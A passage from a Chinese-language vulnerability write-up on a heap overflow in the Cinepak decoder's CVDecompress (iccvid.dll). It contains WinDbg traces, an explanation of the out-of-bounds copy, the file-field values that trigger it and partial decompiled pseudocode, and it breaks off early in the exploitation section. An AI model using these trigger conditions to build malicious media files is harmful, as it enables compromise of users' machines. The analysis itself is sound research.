class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x10b</span>:</span><br><span class="line">73b722b9 <span class="number">7516</span>            <span class="keyword">jne</span>     iccvid!CVDecompress+<span class="number">0x123</span> (73b722d1)    [br=<span class="number">0</span>] <span class="comment">; 不等于则跳转，这里不跳转</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00004000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00004141</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b722bb <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x10d</span>:</span><br><span class="line">73b722bb 8b4b1c          <span class="keyword">mov</span>     <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebx</span>+<span class="number">1Ch</span>] <span class="built_in">ds</span>:<span class="number">0023</span>:001535cc=001535f8 <span class="comment">; ebx = a1 = 001535b0,ecx = 0x001535f8,堆块数据区域首指针</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00004000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=001535f8 <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b722be <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x110</span>:</span><br><span class="line">73b722be 8d3c01          <span class="keyword">lea</span>     <span class="built_in">edi</span>,[<span class="built_in">ecx</span>+<span class="built_in">eax</span>]                                  <span class="comment">; edi = 0x001575f8,堆块数据区域指针增加0x4000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00004000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=001535f8 <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=001575f8</span><br><span class="line"><span class="built_in">eip</span>=73b722c1 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x113</span>:</span><br><span class="line">73b722c1 b900080000      <span class="keyword">mov</span>     <span class="built_in">ecx</span>,<span class="number">800h</span>                                       <span class="comment">; ecx = 0x800,复制数据长度</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00004000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000800</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=001575f8</span><br><span class="line"><span class="built_in">eip</span>=73b722c6 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x118</span>:</span><br><span class="line">73b722c6 8db700e0ffff    <span class="keyword">lea</span>     <span class="built_in">esi</span>,[<span class="built_in">edi</span>-<span class="number">2000h</span>]                                <span class="comment">; esi = 0x001555f8,堆块数据区域指针</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00004000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000800</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=001555f8 <span class="built_in">edi</span>=001575f8</span><br><span class="line"><span class="built_in">eip</span>=73b722cc <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x11e</span>:</span><br><span class="line">73b722cc f3a5            <span class="keyword">rep</span> movs <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="built_in">edi</span>],<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>]            <span class="comment">; 第2次复制数据</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; !heap -p -a <span class="built_in">edi</span></span><br><span class="line">    address 001575f8 found <span class="keyword">in</span></span><br><span class="line">    _HEAP @ <span class="number">90000</span></span><br><span class="line">      HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state</span><br><span class="line">        001535f0 0c01 <span class="number">0000</span>  [<span class="number">01</span>]   001535f8    <span class="number">06000</span> - (busy)</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;通过<code>以上分析</code>及<code>CVDecompress函数</code>的<code>名字</code>，我们可以基本分析出<code>CVDecompress函数</code>的<code>功能</code>，其功能是解码<code>Cinepak(CVID)编解码器</code>编码的<code>视频数据</code>。只有<code>“Strip CVID ID”</code>为<code>0x1100</code>时，才进行<code>堆块内存复制</code>。上面的分析<code>未分析完全</code>，只分析到<code>第二次</code>堆块内存复制，<code>完整的过程</code>如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eax</span>=<span class="number">00002000</span> <span class="built_in">ebx</span>=<span class="number">00157638</span> <span class="built_in">ecx</span>=<span class="number">00000800</span> <span class="built_in">edx</span>=0259fd38 <span class="built_in">esi</span>=<span class="number">00157680</span> <span class="built_in">edi</span>=<span class="number">00159680</span></span><br><span class="line"><span class="built_in">eip</span>=73b722cc <span class="built_in">esp</span>=0259fd04 <span class="built_in">ebp</span>=0259fd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x11e</span>:</span><br><span class="line">73b722cc f3a5            <span class="keyword">rep</span> movs <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="built_in">edi</span>],<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>]            <span class="comment">; 第1次复制数据</span></span><br><span class="line"><span class="number">0</span>:<span class="number">012</span>&gt; !heap -p -a <span class="built_in">edi</span></span><br><span class="line">    address <span class="number">00159680</span> found <span class="keyword">in</span></span><br><span class="line">    _HEAP @ <span class="number">90000</span></span><br><span class="line">      HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state</span><br><span class="line">        <span class="number">00157678</span> 0c01 <span class="number">0000</span>  [<span class="number">01</span>]   <span class="number">00157680</span>    <span class="number">06000</span> - (busy)</span><br><span class="line"><span class="number">0</span>:<span class="number">012</span>&gt; bd <span class="number">1</span></span><br><span class="line"><span class="number">0</span>:<span class="number">012</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00002000</span> <span class="built_in">ebx</span>=<span class="number">00157638</span> <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=0259fd38 <span class="built_in">esi</span>=<span class="number">00159680</span> <span class="built_in">edi</span>=0015b680</span><br><span class="line"><span class="built_in">eip</span>=73b722ce <span class="built_in">esp</span>=0259fd04 <span class="built_in">ebp</span>=0259fd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x120</span>:</span><br><span class="line">73b722ce 8b75e8          <span class="keyword">mov</span>     <span class="built_in">esi</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">18h</span>] <span class="built_in">ss</span>:<span class="number">0023</span>:0259fd18=00ba6912</span><br><span class="line"><span class="number">0</span>:<span class="number">012</span>&gt; be <span class="number">1</span></span><br><span class="line"><span class="number">0</span>:<span class="number">012</span>&gt; g</span><br><span class="line">Breakpoint <span class="number">1</span> hit</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00004000</span> <span class="built_in">ebx</span>=<span class="number">00157638</span> <span class="built_in">ecx</span>=<span class="number">00000800</span> <span class="built_in">edx</span>=0259fd38 <span class="built_in">esi</span>=<span class="number">00159680</span> <span class="built_in">edi</span>=0015b680</span><br><span class="line"><span class="built_in">eip</span>=73b722cc <span class="built_in">esp</span>=0259fd04 <span class="built_in">ebp</span>=0259fd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x11e</span>:</span><br><span class="line">73b722cc f3a5            <span class="keyword">rep</span> movs <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="built_in">edi</span>],<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>]            <span class="comment">; 第2次复制数据</span></span><br><span class="line"><span class="number">0</span>:<span class="number">012</span>&gt; bd <span class="number">1</span></span><br><span class="line"><span class="number">0</span>:<span class="number">012</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00004000</span> <span class="built_in">ebx</span>=<span class="number">00157638</span> <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=0259fd38 <span class="built_in">esi</span>=0015b680 <span class="built_in">edi</span>=0015d680</span><br><span class="line"><span class="built_in">eip</span>=73b722ce <span class="built_in">esp</span>=0259fd04 <span class="built_in">ebp</span>=0259fd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x120</span>:</span><br><span class="line">73b722ce 8b75e8          <span class="keyword">mov</span>     <span class="built_in">esi</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">18h</span>] <span class="built_in">ss</span>:<span class="number">0023</span>:0259fd18=00ba6922</span><br><span class="line"><span class="number">0</span>:<span class="number">012</span>&gt; be <span class="number">1</span></span><br><span class="line"><span class="number">0</span>:<span class="number">012</span>&gt; g</span><br><span class="line">Breakpoint <span class="number">1</span> hit</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00006000</span> <span class="built_in">ebx</span>=<span class="number">00157638</span> <span class="built_in">ecx</span>=<span class="number">00000800</span> <span class="built_in">edx</span>=0259fd38 <span class="built_in">esi</span>=0015b680 <span class="built_in">edi</span>=0015d680</span><br><span class="line"><span class="built_in">eip</span>=73b722cc <span class="built_in">esp</span>=0259fd04 <span class="built_in">ebp</span>=0259fd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x11e</span>:</span><br><span class="line">73b722cc f3a5            <span class="keyword">rep</span> movs <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="built_in">edi</span>],<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>]            <span class="comment">; 第3次复制数据</span></span><br><span class="line"><span class="number">0</span>:<span class="number">012</span>&gt; bd <span class="number">1</span></span><br><span class="line"><span class="number">0</span>:<span class="number">012</span>&gt; p</span><br><span class="line">(f68.ff4): Access violation - code c0000005 (first chance) &lt;---- 内存访问违例</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected <span class="keyword">and</span> handled.</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00006000</span> <span class="built_in">ebx</span>=<span class="number">00157638</span> <span class="built_in">ecx</span>=000001a0 <span class="built_in">edx</span>=0259fd38 <span class="built_in">esi</span>=0015d000 <span class="built_in">edi</span>=0015f000</span><br><span class="line"><span class="built_in">eip</span>=73b722cc <span class="built_in">esp</span>=0259fd04 <span class="built_in">ebp</span>=0259fd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00010246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x11e</span>:</span><br><span class="line">73b722cc f3a5            <span class="keyword">rep</span> movs <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="built_in">edi</span>],<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>]            <span class="comment">; 内存访问违例</span></span><br><span class="line"><span class="number">0</span>:<span class="number">014</span>&gt; !address <span class="built_in">edi</span>                       </span><br><span class="line">Failed to map Heaps (error <span class="number">80004005</span>)</span><br><span class="line"><span class="symbol">Usage:</span>                  &lt;unclassified&gt;</span><br><span class="line">Allocation Base:        <span class="number">00090000</span></span><br><span class="line">Base Address:           0015f000</span><br><span class="line">End Address:            <span class="number">00190000</span></span><br><span class="line">Region Size:            <span class="number">00031000</span></span><br><span class="line"><span class="symbol">Type:</span>                   <span class="number">00020000</span>    MEM_PRIVATE</span><br><span class="line"><span class="symbol">State:</span>                  <span class="number">00002000</span>    MEM_RESERVE <span class="comment">; 即保留内存，保留内存尚不能被实际使用，但其地址空间已被预留，尚需一个提交动作。</span></span><br><span class="line"><span class="symbol">Protect:</span>                <span class="number">00000000</span></span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;通过上面的<code>分析过程</code>，我们可以知道总共进行了<code>3次堆块内存数据复制</code>，<code>第3次数据复制</code>过程中发生<code>内存访问违例</code>。堆块数据区域大小为<code>0x6000字节</code>，<strong><code>第1次</code></strong>堆块内存数据复制时，<strong><code>源地址</code></strong>(esi)为<code>堆块数据区域首地址</code>，<strong><code>目的地址</code></strong>(edi)为<code>堆块数据区域首地址+0x2000</code>，<strong><code>复制数据长度</code></strong>(ecx)为<code>0x800*4=0x2000字节</code>。<strong><code>第2次</code></strong>堆块内存数据复制时，<strong><code>源地址</code></strong>(esi)为<code>堆块数据区域首地址+0x2000</code>，<strong><code>目的地址</code></strong>(edi)为<code>堆块数据区域首地址+0x4000</code>，<strong><code>复制数据长度</code></strong>(ecx)为<code>0x800*4=0x2000字节</code>。<strong><code>第3次</code></strong>堆块内存数据复制时，<strong><code>源地址</code></strong>(esi)为<code>堆块数据区域首地址+0x4000</code>，<strong><code>目的地址</code></strong>(edi)为<code>堆块数据区域首地址+0x6000</code>，<strong><code>复制数据长度</code></strong>(ecx)为<code>0x800*4=0x2000字节</code>。但是<code>第3次</code>堆块内存数据复制时的<code>目的地址</code>已经超出了<code>0x6000</code>字节的<code>堆块数据区域</code>，覆盖了<code>下一个堆块</code>，造成了<code>堆溢出</code>。之后的数据复制由于对<code>内存状态</code>(State)为<code>MEM_RESERVE</code>的内存进行<code>写数据</code>，造成了<code>内存访问异常</code>。</p>
<h2 id="0x40-漏洞利用"><a href="#0x40-漏洞利用" class="headerlink" title="0x40 漏洞利用"></a>0x40 漏洞利用</h2><p>&emsp;&emsp;经过之前的分析，可以知道只有同时满足<code>“Strip CVID ID”</code>为<code>0x1100</code>、<code>“Frame Header”</code>中的<code>“Flags”</code>为<code>0x00</code>和<code>“Frame Header”</code>中的<code>“Number of coded strips”</code>大于1时，才进行<code>堆块内存复制</code>。当<code>“00dc”</code>视频编码数据块中的<code>“Strip CVID ID”</code>为<code>0x1100</code>的Strip的个数<code>大于等于3</code>时，就会造成<code>堆溢出</code>。通过前面对<code>CVDecompress函数</code>的功能的分析，以及<code>IDA</code>分析出的<code>CVDecompress函数</code>的<code>伪代码</code>，我们对其<code>伪代码</code>中的<code>变量</code>进行<code>重命名</code>，可以得到如下<code>更为容易理解</code>的<code>伪代码</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> <span class="keyword">int</span> __<span class="function">stdcall <span class="title">CVDecompress</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> arg1, _BYTE *cinepak_codec_data1, <span class="keyword">unsigned</span> <span class="keyword">int</span> idx1_Len_of_CVID_data, <span class="keyword">int</span> a4, <span class="keyword">int</span> a5, <span class="keyword">int</span> a6, <span class="keyword">int</span> a7)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> arg11; <span class="comment">// ebx</span></span><br><span class="line">  _BYTE *v8; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// ST18_4</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  _BYTE *cinepak_codec_data11; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> Len_of_CVID_data; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int16 Num_of_coded_strips; <span class="comment">// ax</span></span><br><span class="line">  _BYTE *cinepak_codec_data2; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int16 v15; <span class="comment">// cx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int16 Strips_bottom_Y_position; <span class="comment">// ax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int16 Strips_top_Y_position; <span class="comment">// cx</span></span><br><span class="line">  <span class="keyword">int</span> Strip_Y_pixel; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> CVID_Chunk_ID_Ptr; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 *CVID_Chunk_ID_Ptr1; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int16 v21; <span class="comment">// dx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> Size_of_chunk_data; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v23; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> Size_of_chunk_data1; <span class="comment">// [esp+Ch] [ebp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> Num_of_coded_strips1; <span class="comment">// [esp+10h] [ebp-1Ch]</span></span><br><span class="line">  _BYTE *cinepak_codec_data21; <span class="comment">// [esp+14h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> CVID_Chunk_ID_Ptr2; <span class="comment">// [esp+14h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> num; <span class="comment">// [esp+18h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> remain_coded_data_size; <span class="comment">// [esp+1Ch] [ebp-10h]</span></span><br><span class="line">  _BYTE *cinepak_codec_data22; <span class="comment">// [esp+20h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> Size_of_strip_data; <span class="comment">// [esp+24h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> Heap_Ptr_Offset; <span class="comment">// [esp+28h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  arg11 = arg1;</span><br><span class="line">  v8 = *(_BYTE **)(arg1 + <span class="number">36</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v8 )                                     <span class="comment">// v8 == 0x0</span></span><br><span class="line">  &#123;</span><br><span class="line">    v9 = a7;</span><br><span class="line">    *(_DWORD *)(arg1 + <span class="number">36</span>) = <span class="number">0</span>;</span><br><span class="line">    CVDecompress(arg11, v8, <span class="number">0x2446</span>u, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, v9);</span><br><span class="line">    LocalFree(v8);</span><br><span class="line">  &#125;</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// idx1_Len_of_CVID_data如果小于0x20,则直接退出,idx1_Len_of_CVID_data为CVID数据长度</span></span><br><span class="line">  <span class="keyword">if</span> ( 